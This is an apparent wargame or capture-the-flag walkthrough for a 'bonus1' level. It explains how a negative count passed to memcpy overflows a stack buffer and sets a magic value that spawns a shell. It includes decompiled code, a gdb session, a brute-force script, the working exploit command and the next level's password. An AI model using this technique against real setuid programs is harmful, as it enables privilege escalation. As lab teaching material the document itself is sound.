# Bonus 01 Walkthrough

## Binary analysis

The binary takes two arguments: a number and a string. It converts the first argument to an integer (n), checks if n > 9, and then copies n*4 bytes from argv[2] to a stack buffer using memcpy. If n equals 0x574f4c46 (the magic value 'FLOW'), it spawns a shell.

### Key decompiled code
```c
int n = atoi(argv[1]);
if (n > 9)
    return 1;
memcpy(&buffer, argv[2], n * 4);
if (n == 0x574f4c46)
    execl("/bin/sh", "sh", 0);
```

## Exploitation

- The check only prevents n > 9, but negative values are not handled. By passing a large negative value, we can copy more data than intended and overwrite the stack, including the variable n.
- We craft a payload that overwrites n with 0x574f4c46.

We calculate the offset between the dest of memcpy and the variable n, from the disassembly of main :

```
(gdb) b *0x08048478
Breakpoint 1 at 0x8048478
(gdb) r 9 hello
Starting program: /home/user/bonus1/bonus1 9 hello

Breakpoint 1, 0x08048478 in main ()
(gdb) disass
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
=> 0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave  
---Type <return> to continue, or q <return> to quit---
   0x080484a4 <+128>:	ret    
End of assembler dump.
(gdb) p/x $eax
$1 = 0xbffff604
(gdb) p/x $esp + 0x3c
$2 = 0xbffff62c
```

We find the offset to be 40 bytes (0xbffff62c - 0xbffff604).

We craft the payload with the offset and the magic value:

```python
payload = b"A"*40 + b"\x57\x4f\x4c\x46"[::-1]
```

We want to memcpy 44 bytes (40 + 4) to the buffer, so we need to pass a negative value because n * 4 = 44 means n = 11, which is greater than 9, so not possible. With a negative value, we can pass a value that is not greater than 9 but once casted when memcpy is called, it will be greater than 9. With a simple -1, it segfaults.

We brute-force a working negative value:
```python
payload = b"A"*40 + b"\x57\x4f\x4c\x46"
for i in range(-2147483648, 10):
    os.system(f"./bonus1/bonus1 {i} {payload} 2>/dev/null && echo OK for {i}")
```

Working exploit:
```
./bonus1 -2147483635 "$(python -c 'print(b"A"*40 + b"\x57\x4f\x4c\x46"[::-1])')"
```

## Commands used

```
./bonus1 -2147483635 "$(python -c 'print(b"A"*40 + b"\x57\x4f\x4c\x46"[::-1])')"
cat /home/user/bonus2/.pass
```

## Result

After running the exploit, we get a shell as bonus2 and can read the password:

```
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
 